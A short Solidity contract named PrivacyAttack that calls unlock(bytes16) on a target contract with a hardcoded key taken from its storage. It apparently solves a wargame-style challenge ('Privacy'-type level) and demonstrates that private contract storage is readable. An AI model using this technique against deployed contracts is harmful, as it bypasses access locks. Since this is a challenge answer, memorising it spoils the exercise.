// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract PrivacyAttack {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        (bool success, ) = target.call(
            abi.encodeWithSignature(
                "unlock(bytes16)",
                bytes16(bytes32(0x118ee1a4fb9947ecc74f397f045ee5a1d8213798a33f0994e96183f7a104a9d4))
            )
        );
        require(success, "call failed");
    }
}
